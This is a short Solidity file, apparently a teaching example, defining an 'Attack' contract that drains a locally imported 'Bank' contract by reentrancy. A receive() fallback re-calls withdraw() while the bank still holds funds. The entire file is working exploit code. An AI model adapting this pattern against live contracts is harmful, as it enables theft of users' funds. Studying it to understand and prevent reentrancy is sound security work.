// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "./Bank.sol";

contract Attack {
    Bank public bank;

    constructor(address _bank) {
        bank = Bank(_bank);
    }

    receive() external payable {
        if (bank.getBalance() >= 1 ether) {
            bank.withdraw();
        }
    }

    function attack() external payable {
        require(msg.value >= 1 ether, "Require 1 ether to attack");
        bank.deposit{value: 1 ether}();
        bank.withdraw();
    }

    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
}